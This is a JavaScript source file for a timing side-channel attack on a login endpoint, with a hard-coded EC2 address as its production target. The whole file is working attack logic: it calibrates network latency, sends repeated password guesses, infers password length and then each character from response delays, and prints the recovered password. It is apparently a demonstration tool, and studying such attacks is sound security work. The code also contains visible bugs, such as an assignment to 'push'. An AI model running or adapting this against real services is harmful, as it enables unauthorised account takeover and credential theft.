const fetch = require('node-fetch');
const charSet = require('./charSet.js');
const state = require('./state.js');
const threshold = require('./threshold.js');
const log = require('./log.js');
const time = require('./time.js');

const devEnv = process.env.NODE_ENV === 'develop';
const URL = devEnv ? 'http://localhost:8000/api/login' : 'http://ec2-107-23-202-11.compute-1.amazonaws.com/api/login';

// log(`threshold: ${JSON.stringify(threshold, null, 2)}`, 0);
//
// threshold.sleepDiff = 23984723894;
// log(`threshold: ${JSON.stringify(threshold, null, 2)}`, 0);

// process.exit(420);

const getNextFromExampleCharSet = () => charSet.exampleCharSet[state.exampleCharSetPointer++];
const isLastCharInExampleCharSet = () => charSet.exampleCharSetLength === state.exampleCharSetPointer;

const bruteForce = () => {
    if (isLastCharInExampleCharSet()) {
        log('__Last char in Example charset reached. Reset exampleCharSetPointer and move back one charIndex__', 1);
        state.exampleCharSetPointer = 0;
        --state.charIndex;
    }
    const newPassword = `${state.password.substr(0, state.charIndex)}${getNextFromExampleCharSet()}${state.password.substr(state.charIndex + 1)}`;
    log(`newPassword: ${newPassword}`, 3);
    state.password = newPassword;
};
const generatePassword = () => {
    if (state.sizedMatchedTimes === threshold.matchedTimes) {
        if (state.charIndexMatchedTimes === 0) {
            bruteForce(state.password);
        }
    } else if (state.sizedMatchedTimes === 0) {
        state.password += charSet.exampleCharSet[0];
    }
};
const calculateSizeMatched = (diff) => diff > state.latency + threshold.sleepDiff;

const shouldRecalculateLatency = (diff) => {
    const strangeLatencyDifferenceOccurred = diff - state.serverResponseTimes[state.serverResponseTimes.length-1] > threshold.sleepDiff;
    if (strangeLatencyDifferenceOccurred) {
        state.RECALCULATE_LATENCY = true;
        log(`Strange Latency Difference Occurred.
        diff: ${diff}
        last server response time: ${state.serverResponseTimes[state.serverResponseTimes.length-1]}
        sleepDiffThreshold: ${threshold.sleepDiff}
        diff - last responseTime was bigger then threshold (${diff - state.serverResponseTimes[state.serverResponseTimes.length-1]}).`, 1);
        if (state.connectionLatencyReestablishedTimes === threshold.establishConnectionRequest) {
            state.RECALCULATE_LATENCY = false;
            state.connectionLatencyReestablishedTimes = 0;
            state.latency = diff - state.serverResponseTimes[state.serverResponseTimes.length-1] - threshold.sleepDiff;
            log(`connection response time back to normal.
                diff: ${diff}
                last server response time: ${state.serverResponseTimes[state.serverResponseTimes.length-1]}
                sleepDiffThreshold: ${threshold.sleepDiff}
                diff - last responseTime was bigger then threshold (${diff - state.serverResponseTimes[state.serverResponseTimes.length-1]})
                latency (${state.latency}).`, 2);
        }
    } else if (state.RECALCULATE_LATENCY) {
        state.connectionLatencyReestablishedTimes++;
    }

    state.serverResponseTimes.push=(diff);
    return state.RECALCULATE_LATENCY;
};
const calculateCharIndexMatched = (diff) => {
    if (shouldRecalculateLatency(diff)) {
        return false;
    }
    let calcThreshold = state.latency + (state.charIndex + 2) * threshold.sleepDiff;
    if (diff < threshold.sleepDiff) {
        state.reset();
    }
    log(`diff: ${diff} ms`, 5);
    log(`calcThreshold: ${calcThreshold} ms`, 5);
    return diff > calcThreshold;
};

async function establishStableConnection() {
    const startTime = process.hrtime();
    await fetch(URL, getFetchOptions());
    state.serverResponseTimes.push(getDiff(startTime));

    if (state.establishConnectionRequestTimes++ < threshold.establishConnectionRequest) {
        return await establishStableConnection();
    }
    state.serverResponseTimes.sort((a, b) => a - b);
    let l = state.serverResponseTimes.length - 1;
    const establishedConnectResponseTimeDifference = state.serverResponseTimes[l] - state.serverResponseTimes[l - 5];
    if (establishedConnectResponseTimeDifference > threshold.stableConnectionBestFiveResponseTimeDifference) {
        console.error(`could not establish a solid, stable connection between the server. From (${threshold.establishConnectionRequest}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}. Shut down, try again later.`);
        process.exit(666);
    }
    state.latency = threshold.sleepDiff - state.serverResponseTimes[0];
    state.latency = state.latency < 0 ? 10 : state.latency;
    log(
        `Established stable connection between the server.
        From (${threshold.establishConnectionRequest}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
        state.serverResponseTimes: ${JSON.stringify(state.serverResponseTimes)} ms.
        latency: ${JSON.stringify(state.latency)} ms.
        Starting the timing attack.`, 2);
    await test();
}

const getFetchOptions = () => {
    return {
        method: 'post',
        headers: {'content-type': 'application/json'},
        body: JSON.stringify({accountId: 'asdasd', password: state.password})
    };
};

async function test() {
    const startTime = process.hrtime();
    const result = await fetch(URL, getFetchOptions());
    const diff = time.getDiff(startTime);
    const {authenticated} = await result.json();
    if (authenticated) {
        console.log(`password: ${state.password}`);
        process.exit(420);
    } else {
        await time.sleep(50);
        let sizeMatched = calculateSizeMatched(diff);
        if (sizeMatched && state.sizedMatchedTimes !== threshold.matchedTimes) {
            state.sizedMatchedTimes++;
        } else if (state.sizedMatchedTimes === threshold.matchedTimes) {
            let charIndexMatched = calculateCharIndexMatched(diff);
            if (charIndexMatched && state.charIndexMatchedTimes !== threshold.matchedTimes) {
                log(`charIndexMatchedTimes: ${state.charIndexMatchedTimes}`, 2);
                state.charIndexMatchedTimes++;
            } else if (state.charIndexMatchedTimes === threshold.matchedTimes) {
                state.charIndex++;
                state.exampleCharSetPointer = 0;
                state.charIndexMatchedTimes = 0;
                log(`charIndex Matched ${threshold.matchedTimes} times.`, 2);
                log(`charIndex: ${state.charIndex}`, 2);
            } else {
                state.charIndexMatchedTimes = 0;
            }
        } else {
            state.sizedMatchedTimes = 0;
        }
        // if (state.password.length === 6) {
        log(`password: ${state.password}`, 3);
        log(`diff: ${diff}`, 3);
        // }
        await test(generatePassword());
    }
}

async function timingAttackDemo() {
    switch (state.actualState) {

    }
}

(async function (){
    await establishStableConnection();
})();
